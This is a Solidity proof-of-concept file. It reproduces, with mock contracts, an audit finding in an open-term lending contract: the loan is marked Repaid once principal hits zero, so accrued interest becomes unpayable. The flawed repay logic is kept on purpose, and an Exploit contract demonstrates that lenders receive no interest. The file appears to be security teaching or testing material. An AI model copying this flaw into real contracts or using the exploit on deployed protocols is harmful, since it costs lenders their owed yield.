// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Accountable — AccountableOpenTerm loan interest cannot be repaid once
    principal hits zero (Cyfrin 2025-10-16, finding #62973)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: repay() services principal first; when outstandingPrincipal
    reaches 0 the loan flips to Repaid. In Repaid, further supply/repay is
    blocked and sharePrice falls back to assetShareRatio (ignoring the
    accrued scaleFactor). Accrued interest is permanently unpayable — LPs
    get principal back with zero interest.
    Vulnerable principal-zero → Repaid transition preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockUSDC {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal ERC4626-style vault holding LP deposits.
contract AccountableVault {
    MockUSDC public asset;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    uint256 public totalAssets;

    constructor(MockUSDC a) {
        asset = a;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        asset.transferFrom(msg.sender, address(this), assets);
        shares = assets; // 1:1
        balanceOf[receiver] += shares;
        totalSupply += shares;
        totalAssets += assets;
    }

    function pull(address to, uint256 assets) external {
        require(totalAssets >= assets, "vault liq");
        totalAssets -= assets;
        asset.transfer(to, assets);
    }

    function push(uint256 assets) external {
        totalAssets += assets;
    }
}

enum LoanState {
    Ongoing,
    Repaid
}

/// @notice Reduced AccountableOpenTerm: interest accrues via scaleFactor but
/// repay only reduces principal; principal-zero flips to Repaid and freezes interest.
/// Source: AccountableOpenTerm (Accountable-Protocol credit-vaults / audit-2025-09).
contract AccountableOpenTerm {
    uint256 public constant PRECISION = 1e36;

    AccountableVault public vault;
    MockUSDC public asset;
    address public borrower;

    LoanState public loanState = LoanState.Ongoing;
    uint256 public outstandingPrincipal;
    uint256 public scaleFactor = PRECISION;
    uint256 public interestRate; // PRECISION-scaled additive growth per second

    constructor(AccountableVault v, MockUSDC a, address b, uint256 ratePerSecond) {
        vault = v;
        asset = a;
        borrower = b;
        interestRate = ratePerSecond;
    }

    function _requireLoanOngoing() internal view {
        require(loanState == LoanState.Ongoing, "not ongoing");
    }

    /// @dev Cheatcode-free time accrual: apply `secondsElapsed` of interest.
    function forceAccrue(uint256 secondsElapsed) external returns (uint256) {
        if (loanState != LoanState.Ongoing || outstandingPrincipal == 0 || secondsElapsed == 0) {
            return scaleFactor;
        }
        uint256 growth = interestRate * secondsElapsed;
        scaleFactor = scaleFactor + (scaleFactor * growth) / PRECISION;
        return scaleFactor;
    }

    function borrow(uint256 assets) external {
        _requireLoanOngoing();
        require(msg.sender == borrower, "borrower");
        outstandingPrincipal += assets;
        vault.pull(borrower, assets);
    }

    /// @notice Repay assets. First reduces outstandingPrincipal; when principal
    /// hits zero the loan is marked Repaid — accrued interest is never required.
    function repay(uint256 assets) external {
        _requireLoanOngoing();
        require(msg.sender == borrower, "borrower");
        asset.transferFrom(msg.sender, address(vault), assets);
        vault.push(assets);

        if (assets >= outstandingPrincipal) {
            // FIX: track debt shares; only mark Repaid when debtShares == 0 after burning at current scaleFactor
            outstandingPrincipal = 0;
            loanState = LoanState.Repaid; // @> VULN: principal hits zero → loan marked Repaid WITHOUT requiring interest (scaleFactor) to be paid
        } else {
            outstandingPrincipal -= assets;
        }
    }

    /// @notice Supply extra assets (would realize interest if Ongoing). Blocked when Repaid.
    function supply(uint256 assets) external {
        _requireLoanOngoing(); // blocks once Repaid — interest forever unpayable
        require(msg.sender == borrower, "borrower");
        asset.transferFrom(msg.sender, address(vault), assets);
        vault.push(assets);
    }

    /// @notice Share price: Ongoing uses scaleFactor; Repaid falls back to assetShareRatio.
    function sharePrice() public view returns (uint256) {
        if (loanState == LoanState.Repaid) {
            if (vault.totalSupply() == 0) return PRECISION;
            return (vault.totalAssets() * PRECISION) / vault.totalSupply();
        }
        return scaleFactor;
    }

    function virtualInterestOn(uint256 principal0) public view returns (uint256) {
        if (scaleFactor <= PRECISION) return 0;
        return (principal0 * (scaleFactor - PRECISION)) / PRECISION;
    }
}

/// @notice Borrower (this) repays principal only after interest accrues → LPs get 0 interest.
/// CREATE order: usdc (1), vault (2), loan (3).
contract Exploit {
    MockUSDC public usdc;
    AccountableVault public vault;
    AccountableOpenTerm public loan;

    address public constant ALICE = address(0xA11CE); // sole LP

    uint256 public constant USDC_AMOUNT = 1_000_000e6;
    uint256 public constant PRECISION = 1e36;

    uint256 public scaleBeforeRepay;
    uint256 public sharePriceAfter;
    uint256 public interestForgiven;
    bool public supplyBlocked;

    constructor() {
        usdc = new MockUSDC(); // nonce 1
        vault = new AccountableVault(usdc); // nonce 2
        // 180 days of ~7.5% growth: interestRate * 180 days = 0.075e36
        uint256 seconds180 = 180 days;
        uint256 interestRate = (75e33) / seconds180;
        // borrower = this (Exploit orchestrates as the malicious/careless borrower)
        loan = new AccountableOpenTerm(vault, usdc, address(this), interestRate); // nonce 3
    }

    function run() external {
        // LP Alice deposits full capacity (via Exploit funding the vault deposit)
        usdc.mint(address(this), USDC_AMOUNT);
        usdc.approve(address(vault), type(uint256).max);
        vault.deposit(USDC_AMOUNT, ALICE);
        require(vault.totalAssets() == USDC_AMOUNT, "vault funded");

        // Borrower draws full principal
        loan.borrow(USDC_AMOUNT);
        require(vault.totalAssets() == 0, "all borrowed");
        require(loan.outstandingPrincipal() == USDC_AMOUNT, "principal out");

        // Time passes → virtual interest accrues
        scaleBeforeRepay = loan.forceAccrue(180 days);
        require(scaleBeforeRepay > PRECISION, "scale grew");
        interestForgiven = loan.virtualInterestOn(USDC_AMOUNT);
        require(interestForgiven > 0, "interest accrued");

        // Borrower repays EXACTLY principal (no extra for interest)
        usdc.mint(address(this), USDC_AMOUNT);
        usdc.approve(address(loan), type(uint256).max);
        // loan.repay pulls from borrower via transferFrom to vault
        loan.repay(USDC_AMOUNT);

        require(uint8(loan.loanState()) == uint8(LoanState.Repaid), "flipped to Repaid");

        // Share price falls back to assetShareRatio == PRECISION (no interest)
        sharePriceAfter = loan.sharePrice();
        require(sharePriceAfter == PRECISION, "no interest realized");
        require(vault.totalAssets() == USDC_AMOUNT, "only principal in vault");

        // Borrower cannot pay the interest anymore
        usdc.mint(address(this), 1e6);
        usdc.approve(address(loan), type(uint256).max);
        supplyBlocked = false;
        try loan.supply(1e6) {
            supplyBlocked = false;
        } catch {
            supplyBlocked = true;
        }
        require(supplyBlocked, "supply should be blocked after Repaid");

        // Harm: accrued interest permanently forgiven; LPs get 0 yield.
        require(
            supplyBlocked && sharePriceAfter == PRECISION && interestForgiven > 0,
            "harm not demonstrated"
        );
    }
}
